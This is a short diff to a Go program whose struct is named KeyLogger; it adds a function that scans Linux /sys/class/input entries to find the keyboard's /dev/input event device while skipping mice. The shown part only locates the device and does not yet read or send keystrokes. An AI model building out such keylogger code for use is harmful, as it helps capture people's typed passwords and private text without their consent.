@@ -1,13 +1,14 @@
 package main
 
 import (
+	"fmt"
 	"os"
 	"strings"
 )
 
 // Wrapper
 type KeyLogger struct {
-   fs *os.File
+   fd *os.File
 }
 
 var keyMap = map[uint16]string{
@@ -82,8 +83,34 @@ func (d *device) hasDevice(s string) bool{
     return false
 }
 
+var restrictedD = device{"mouse"}
+var allowedD = device{"keyboard"}
 
-func Read() {}
+//  
+func FindKeyBoard() string {
+    path := "/sys/class/input/event%d/device/name"
+    res := "/dev/input/event%d"
+
+
+    for i := 0; i < 255; i++ {
+        buff, err := os.ReadFile(fmt.Sprintf(path, i))
+
+        if err != nil {
+            continue
+        }
+
+        deviName := strings.ToLower(string(buff))
+
+        if restrictedD.hasDevice(deviName) {
+            continue
+        } else if allowedD.hasDevice(deviName) {
+            return fmt.Sprintf(res, i)
+        }
+
+    }
+
+    return ""
+}
 
 
 func main() {
